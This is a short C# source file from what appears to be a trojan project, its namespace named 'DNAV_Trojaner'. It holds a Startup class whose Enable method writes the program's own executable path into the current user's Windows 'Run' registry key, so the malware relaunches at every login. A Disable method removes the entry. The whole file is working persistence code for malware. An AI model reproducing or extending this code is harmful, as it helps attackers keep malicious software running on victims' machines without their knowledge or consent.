using Microsoft.Win32;
using System.Windows.Forms;

namespace DNAV_Trojaner
{
    class Startup
    {
        public static void Enable()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("DNAV", Application.ExecutablePath.ToString());
            key.Close();
        }

        public static void Disable()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.DeleteValue("DNAV", false);
        }
    }
}
